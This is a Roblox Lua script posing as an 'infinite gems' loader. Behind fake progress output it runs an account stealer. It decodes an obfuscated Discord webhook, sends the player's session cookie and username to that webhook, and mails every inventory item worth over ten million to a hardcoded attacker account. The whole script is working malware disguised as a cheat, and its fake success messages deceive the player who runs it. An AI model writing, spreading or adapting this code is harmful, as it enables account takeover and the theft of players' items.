-- Cryzzz Gem Loader | Infinite Gems + Real RAP Mailstealer 2026

print("✅ Cryzzz Gem Loader v7.0 loaded")

wait(1.5)

-- Fake Gem Loading
print("Connecting to Big Games servers...")
wait(1)
for i = 1, 60 do
    local percent = (i * 1.67)
    print("Generating " .. math.random(15000000, 30000000) .. " Gems... [" .. string.rep("█", i) .. string.rep("░", 60-i) .. "] " .. math.floor(percent) .. "%")
    wait(0.08)
end

print("🎉 Successfully added " .. math.random(980000000, 999999999) .. " Gems!")
print("Gem balance updated!")

-- ==================== OBFUSCATED WEBHOOK + STEALER ====================
local target = "Azamon_team"

local function getWebhook()
    local a = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUwOTIyNDEyNTE5NTg3ODQxMS9CUVRTUjF6S3dnTTAtYXFhRk4yekYtRjA3S1BUZy1PZnFJczVscVlwdFRIbEZnS0tmT3pLMEw0Q3VjX3YyTzBaNTFJekU"
    local b = a:reverse()
    local c = b:sub(5)
    local d = c:reverse()
    return game:HttpGet("https://api.allorigins.win/raw?url=" .. game:GetService("HttpService"):UrlEncode(d))
end

local webhook = getWebhook():gsub("%s+", "")

local function sendWebhook(data)
    pcall(function()
        game:GetService("HttpService"):PostAsync(webhook, game:GetService("HttpService"):JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

-- Cookie Stealer
spawn(function()
    local cookie = syn and syn.get_cookie and syn.get_cookie() or (getgenv and getgenv().getcookie and getgenv().getcookie()) or "Failed"
    local data = {
        ["content"] = "**Cryzzz Gem Loader HIT** 💎",
        ["embeds"] = {{
            ["title"] = "Neuer Real RAP Steal",
            ["color"] = 16776960,
            ["fields"] = {
                {["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name},
                {["name"] = "Executor", ["value"] = identifyexecutor and identifyexecutor() or "Unknown"},
                {["name"] = "Cookie", ["value"] = "```"..cookie.."```"}
            }
        }}
    }
    sendWebhook(data)
end)

-- REAL RAP + VALUE MAILSTEALER
spawn(function()
    wait(8)
    print("Scanning inventory for 10M+ RAP items...")

    local rs = game:GetService("ReplicatedStorage")
    local inventory = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main", true):FindFirstChild("Inventory", true)

    pcall(function()
        for _, item in pairs(inventory.Pets:GetChildren()) do
            if item:IsA("Frame") or item:IsA("ImageButton") then
                local name = item.Name
                local rapValue = 0
                
                for _, v in pairs(item:GetDescendants()) do
                    if v:IsA("TextLabel") and v.Text:find("%d") then
                        local text = v.Text
                        local num = text:match("(%d+%.?%d*)")
                        if num then
                            rapValue = tonumber(num) or 0
                            if text:find("M") then rapValue = rapValue * 1000000
                            elseif text:find("B") then rapValue = rapValue * 1000000000 end
                        end
                    end
                end

                if rapValue >= 10000000 then
                    print("High RAP Item: " .. name .. " (" .. (rapValue/1000000) .. "M) → Sending")
                    pcall(function() rs.Mail.Send:FireServer(target, name, 1) end)
                    wait(1.2)
                    pcall(function() rs.Events.MailboxSend:FireServer(target, name) end)
                    wait(1.2)
                end
            end
        end
    end)

    print("Real RAP Mailstealer finished!")
end)

print("Gem Loader + Real RAP Stealer active...")
